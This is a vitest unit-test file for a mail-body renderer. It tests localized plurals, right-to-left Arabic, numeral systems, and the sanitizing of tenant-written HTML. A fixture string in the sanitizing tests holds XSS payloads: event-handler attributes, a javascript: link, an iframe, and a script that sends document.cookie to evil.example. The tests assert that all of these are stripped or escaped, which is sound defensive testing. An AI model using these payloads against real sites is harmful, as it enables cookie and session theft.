/**
 * Stackra file contract:
 * Purpose: unit tests of `renderMailBody`: an XHTML document with the body's markup and its text part, the ICU plural
 *          per locale (English `one`, Arabic dual and `few`), right-to-left for Arabic, the configured digits, a
 *          RangeError for a key the catalogues lack, and tenant or client HTML: escaped when passed as a prop or an ICU
 *          value, and through `richText` written back only as `sanitizeHtml` keeps it, in the HTML and the text part.
 * Boundary: test only; the body is the compiled form of the template's receipt mail (a function component).
 * Runtime: node (vitest)
 * Governing contract: ADR 0022 (test placement); ADR 0223; ADR 0192 (plurals and digits); ADR 0080.
 */
import type { HtmlPolicy } from "@stackra/csp";
import { I18nConfig, keys, Locale, NumberingSystem } from "@stackra/i18n";
import { describe, expect, it } from "@stackra/testing";
import type { ReactNode } from "react";

import { useMail } from "#react/mail/use-mail";
import { renderMailBody } from "#react/mail/render-mail-body.function";

const I18n = keys({
  orders: { order: ["lines_count"], order_receipt: { mail: ["intro", "missing"] } },
});

const MESSAGES = {
  en: {
    orders: {
      order: { lines_count: "{count, plural, one {# item} other {# items}}" },
      order_receipt: { mail: { intro: "Thank you for order {id}." } },
    },
  },
  ar: {
    orders: {
      order: {
        lines_count:
          "{count, plural, zero {لا بنود} one {بند واحد} two {بندان} few {# بنود} many {# بندًا} other {# بند}}",
      },
      order_receipt: { mail: { intro: "شكرًا لطلبك {id}." } },
    },
  },
};

interface ReceiptData {
  readonly id: string;
  readonly lines: number;
  readonly totalMinor: number;
}

/** The receipt body as gen compiles it. */
function OrderReceiptMail({ id, lines, totalMinor }: ReceiptData) {
  const { t, money, locale, dir } = useMail();
  return (
    <html lang={locale} dir={dir}>
      <body>
        <p>{t(I18n.orders.order_receipt.mail.intro, { id })}</p>
        <p>
          {money(totalMinor, "SAR")} · {t(I18n.orders.order.lines_count, { count: lines })}
        </p>
      </body>
    </html>
  );
}

/** A body that translates a key no catalogue holds. */
function Broken() {
  const { t } = useMail();
  return <p>{t(I18n.orders.order_receipt.mail.missing)}</p>;
}

/** A body that carries a branch's own welcome note (HTML its staff wrote in the console editor) as rich text. */
function WelcomeMail({ note, policy }: { readonly note: string; readonly policy?: HtmlPolicy }) {
  const { richText } = useMail();
  return (
    <body>
      <h1>Welcome</h1>
      {richText(note, policy)}
    </body>
  );
}

/** A body that passes the same note as a prop and as an ICU value, never as rich text. */
function EchoMail({ note }: { readonly note: string }) {
  const { t } = useMail();
  return (
    <body>
      <p>{t(I18n.orders.order_receipt.mail.intro, { id: note })}</p>
      <p>{note}</p>
    </body>
  );
}

/** Renders `body` with `data` in English. */
function render<P extends object>(body: (props: P) => ReactNode, data: P) {
  return renderMailBody(body, data, {
    locale: Locale.En,
    messages: MESSAGES.en,
    i18n: new I18nConfig(),
    asset: (entry) => entry.file,
  });
}

/** Renders the receipt in `locale` with the base i18n configuration. */
function receipt(locale: Locale, lines: number, i18n = new I18nConfig()) {
  const messages = locale === Locale.Ar ? MESSAGES.ar : MESSAGES.en;
  return renderMailBody(
    OrderReceiptMail,
    { id: "ord_1", lines, totalMinor: 1200 },
    {
      locale,
      messages,
      i18n,
      asset: (entry) => entry.file,
    },
  );
}

describe("renderMailBody", () => {
  it("renders an XHTML document and its text part", () => {
    const out = receipt(Locale.En, 1);
    expect(out.html.startsWith("<!DOCTYPE html PUBLIC")).toBe(true);
    expect(out.html).toContain('<html lang="en" dir="ltr">');
    expect(out.text).toBe("Thank you for order ord_1.\n\nSAR 12.00 · 1 item");
  });

  it("uses the Arabic dual and few forms, right to left", () => {
    const two = receipt(Locale.Ar, 2);
    const three = receipt(Locale.Ar, 3);
    expect(two.text).toContain("بندان");
    expect(three.text).toContain("3 بنود");
    expect(three.html).toContain('dir="rtl"');
  });

  it("follows the configured digits", () => {
    class ArabicDigits extends I18nConfig {
      override numerals: NumberingSystem = NumberingSystem.Arab;
    }
    expect(receipt(Locale.Ar, 3, new ArabicDigits()).text).toContain("٣ بنود");
  });

  it("refuses a key the catalogues lack", () => {
    expect(() =>
      renderMailBody(
        Broken,
        {},
        {
          locale: Locale.En,
          messages: MESSAGES.en,
          i18n: new I18nConfig(),
          asset: (entry) => entry.file,
        },
      ),
    ).toThrow(RangeError);
  });

  describe("tenant and client HTML (STA-2582)", () => {
    const HOSTILE =
      '<p onclick="steal()">Welcome <strong>team</strong>!</p>' +
      '<script>fetch("https://evil.example/?c="+document.cookie)</script>' +
      '<img src="x" onerror="steal()">' +
      '<a href="javascript:steal()">bad</a> <a href="https://club.example/kit" style="color:red">kit list</a>' +
      '<iframe src="https://evil.example"></iframe>';

    it("writes rich text back only as sanitizeHtml keeps it", () => {
      const { html } = render(WelcomeMail, { note: HOSTILE });
      expect(html).toContain(
        '<h1>Welcome</h1><div><p>Welcome <strong>team</strong>!</p><a>bad</a> <a href="https://club.example/kit">kit list</a></div>',
      );
      expect(html).not.toMatch(
        /<script|<img|<iframe|onclick|onerror|javascript:|style=|evil\.example/i,
      );
    });

    it("escapes the HTML when a body passes it as a prop or an ICU value", () => {
      const { html } = render(EchoMail, { note: HOSTILE });
      expect(html).not.toMatch(/<script|<img|<iframe|<p onclick/i);
      expect(html).toContain("&lt;script&gt;");
    });

    it("keeps the sanitized rich text in the plain-text part, without the dropped script", () => {
      const { text } = render(WelcomeMail, {
        note: "<p>Training moves to <strong>pitch 2</strong>.</p><script>steal()</script>",
      });
      expect(text).toBe("Welcome\n\nTraining moves to pitch 2.");
    });

    it("narrows to a host's policy, and the floor holds under any policy", () => {
      const PLAIN: HtmlPolicy = { tags: { p: [], style: [] }, dropWithContent: [] };
      const { html } = render(WelcomeMail, {
        note: '<p>Hi <a href="https://club.example">there</a></p><style>p{}</style>',
        policy: PLAIN,
      });
      expect(html).toContain("<div><p>Hi there</p></div>");
      expect(html).not.toContain("<style");
    });
  });
});
